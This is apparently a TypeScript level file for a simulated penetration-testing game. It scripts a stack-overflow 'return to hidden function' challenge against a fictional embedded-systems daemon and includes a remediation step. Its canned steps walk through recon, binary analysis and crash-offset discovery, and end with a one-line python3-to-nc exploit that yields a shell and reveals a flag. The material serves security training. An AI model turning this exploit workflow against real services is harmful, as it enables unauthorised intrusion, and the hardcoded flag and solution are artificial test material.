import type { ChainDef } from "../../types";
import { match, strictCmd, matchesExactAddress, matchesExactOffset } from "../../engine";

const IP = "192.0.2.230";

export const ghostLevel3: ChainDef = {
  id: "ghost-3",
  difficulty: "ghost",
  order: 3,
  points: 280,
  title: "Return Address",
  codename: "GHOST ASSESSMENT — RETURN ADDRESS",
  summary: "A debug binary nobody meant to expose. No shellcode, no ROP chain — just an overflow, a hidden function, and a return address that goes wherever you point it.",
  briefing: [
    `TARGET: Solstice Embedded Systems — ${IP}`,
    "OBJECTIVE: get a shell on the live service and prove it.",
    "",
    "There's a custom network daemon on this box, and a file share that shouldn't be reachable from",
    "outside. Everything you need to build the exploit is available offline, before you ever touch",
    "the live target with anything but recon.",
  ],
  debrief: [
    "root cause: netdiagd copied user input into a fixed-size stack buffer with no bounds check",
    "(classic stack buffer overflow, CWE-121), compiled with no stack canary and a fixed load address",
    "(no PIE). A debug build with a hardcoded backdoor function was left reachable from an exposed",
    "file share, and the overflow was enough to redirect execution straight into it.",
    "",
    "SOLSTICE EMBEDDED SYSTEMS: SECURED.",
  ],
  nodes: [
    {
      id: "solstice",
      org: "Solstice Embedded Systems",
      city: "Solstice",
      state: "WA",
      coords: { x: 15.3, y: 7.6 },
      ip: IP,
      tagline: "Embedded diagnostics vendor",
      briefing: [`IP: ${IP}`, "No further information provided."],
      initialPrompt: "op@breachline:~$",
      motd: [],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "identify", label: "Locate and retrieve the exposed debug binary", tactic: "Discovery", requires: ["recon"] },
        { id: "analyze", label: "Determine the binary's memory protections", tactic: "Discovery", requires: ["identify"] },
        { id: "locate-win", label: "Find the address of the hidden backdoor function", tactic: "Discovery", requires: ["analyze"] },
        { id: "find-offset", label: "Determine the exact overflow offset via crash analysis", tactic: "Discovery", requires: ["locate-win"] },
        { id: "exploit", label: "Craft and deliver a working exploit against the live service", tactic: "Initial Access", requires: ["find-offset"] },
        { id: "loot", label: "Recover proof of shell access", tactic: "Collection", requires: ["exploit"] },
        { id: "secure", label: "Patch the overflow and remove the debug build from production", tactic: "Remediation", requires: ["loot"] },
      ],
      hints: [
        "before you touch the live service with anything but recon, get a copy of what's actually running. an exposed file share is worth checking for exactly that.",
        "protections and hidden functionality are both things static analysis tells you before you ever cause a crash. crash analysis is a separate, later step — do them in that order.",
        "a return address overwrite doesn't need shellcode if there's already a function in the binary worth jumping to. the exact offset comes from a crash, not a guess.",
      ],
      debrief: [],
      commands: [
        strictCmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT     STATE SERVICE VERSION",
              "80/tcp   open  http    nginx 1.24.0 (internal file share)",
              "7878/tcp open  unknown netdiagd (custom protocol)",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 4.40 seconds",
            ],
          }),
        }),
        strictCmd({
          id: "curl-files",
          tool: "curl",
          requires: ["http://" + IP],
          forbids: ["files/netdiagd"],
          help: "curl http://<ip>/files/",
          requiresFlags: ["scanned"],
          run: () => ({
            tone: "output",
            output: [
              "HTTP/1.1 200 OK",
              "",
              "<title>Internal Build Share</title>",
              '<a href="/files/netdiagd">netdiagd (debug build, 2024-03-11)</a>',
            ],
          }),
        }),
        strictCmd({
          id: "curl-download",
          tool: "curl",
          requires: ["http://" + IP, "files/netdiagd"],
          help: "curl -O http://<ip>/files/netdiagd",
          requiresFlags: ["scanned"],
          run: () => ({
            completesObjective: "identify",
            tone: "success",
            setsFlags: ["have_binary"],
            output: [
              "HTTP/1.1 200 OK",
              "Saving to: 'netdiagd'",
              "",
              "netdiagd: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped",
            ],
          }),
        }),
        strictCmd({
          id: "checksec",
          tool: "checksec",
          requires: ["netdiagd"],
          help: "checksec ./netdiagd",
          requiresFlags: ["have_binary"],
          run: () => ({
            completesObjective: "analyze",
            tone: "success",
            setsFlags: ["saw_protections"],
            note: "Solstice netdiagd — fixed image base: 0x0000000000400000 (non-PIE)",
            output: [
              "CANARY    : disabled",
              "NX        : enabled",
              "PIE       : disabled",
              "BASE      : 0x0000000000400000",
              "RELRO     : partial",
              "",
              "note: no canary and a fixed load address, on a binary that reads unbounded input — worth",
              "checking what else is compiled in.",
            ],
          }),
        }),
        strictCmd({
          id: "objdump",
          tool: "objdump",
          requires: ["netdiagd"],
          help: "objdump -d ./netdiagd",
          requiresFlags: ["saw_protections"],
          run: () => ({
            completesObjective: "locate-win",
            tone: "success",
            setsFlags: ["have_win_addr"],
            note: "Solstice netdiagd — hidden backdoor function give_shell(), symbol offset 0x1196 from image base",
            output: [
              "give_shell:  0000000000001196   (offset from image base — see checksec's BASE line)",
              "  1196:  55                    push   %rbp",
              "  1197:  48 89 e5              mov    %rsp,%rbp",
              "  119a:  48 8d 3d ...          lea    ... ; \"/bin/sh\"",
              "  11a5:  e8 ...                call   system@plt",
              "",
              "note: give_shell() exists in the binary but is never called anywhere in main() — dead code,",
              "unless something redirects execution straight to it.",
            ],
          }),
        }),
        strictCmd({
          id: "nc-connect",
          tool: "nc",
          requires: [IP, "7878"],
          help: "nc <ip> 7878",
          requiresFlags: ["scanned"],
          run: () => ({
            tone: "output",
            output: ["netdiagd v1.2 — send a diagnostic string"],
          }),
        }),
        strictCmd({
          id: "cyclic",
          tool: "cyclic",
          requires: ["200"],
          help: "cyclic 200",
          requiresFlags: ["have_win_addr"],
          run: () => ({
            tone: "output",
            setsFlags: ["have_pattern"],
            output: ["aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaax..."],
          }),
        }),
        strictCmd({
          id: "crash-test",
          tool: "./netdiagd",
          requires: ["aaaabaaacaaad"],
          help: "./netdiagd $(cyclic 200)",
          requiresFlags: ["have_pattern"],
          run: () => ({
            completesObjective: "find-offset",
            tone: "success",
            setsFlags: ["have_offset"],
            note: "Solstice netdiagd — overflow offset to return address: 72 bytes",
            output: [
              "Segmentation fault (core dumped)",
              "",
              "core: crashed return address = 0x6161616c61616161",
              "cyclic offset for 6161616c: 72",
              "",
              "[+] 72 bytes of padding land exactly on the return address.",
            ],
          }),
        }),
        {
          id: "exploit",
          tool: "python3",
          match: (input) => {
            const n = input.toLowerCase();
            return (
              matchesExactOffset(n, 72) &&
              matchesExactAddress(n, "401196") &&
              n.includes("nc ") &&
              n.includes(IP) &&
              matchesExactOffset(n, 7878)
            );
          },
          help: 'python3 -c "print(\'A\'*72 + p64(0x401196))" | nc <ip> 7878',
          requiresFlags: ["have_offset"],
          deniedOutput: ["you need the exact offset and the backdoor's real address before this does anything but crash the service."],
          run: () => ({
            completesObjective: "exploit",
            tone: "success",
            setsFlags: ["shell_access"],
            promptAfter: "netdiag@solstice:~$",
            output: [
              "[+] 72 bytes of padding, then the address of give_shell(), sent over the wire",
              "[+] return address overwritten — execution redirected into give_shell()",
              "",
              "[+] shell obtained on the live service via a return-to-function overflow.",
            ],
          }),
        },
        strictCmd({
          id: "cat-flag",
          tool: "cat",
          requires: ["flag.txt"],
          help: "cat flag.txt",
          requiresFlags: ["shell_access"],
          run: () => ({
            completesObjective: "loot",
            tone: "success",
            note: "Solstice Embedded Systems — flag.txt: 4e9d2329c9f095f28ec1547f7d928538",
            output: ["4e9d2329c9f095f28ec1547f7d928538"],
          }),
        }),
        {
          id: "secure",
          tool: "secure",
          match: match.startsWith("secure system", "secure", "remediate"),
          help: "secure system",
          requiresObjectives: ["loot"],
          deniedOutput: ["confirm shell access before you file the fix."],
          run: () => ({
            completesObjective: "secure",
            tone: "success",
            output: [
              "[+] added bounds checking to the vulnerable input routine",
              "[+] removed give_shell() and rebuilt without the debug backdoor",
              "[+] enabled a stack canary and pulled the debug binary off the public file share",
              "",
              "SOLSTICE EMBEDDED SYSTEMS: SECURED",
            ],
          }),
        },
      ],
    },
  ],
};
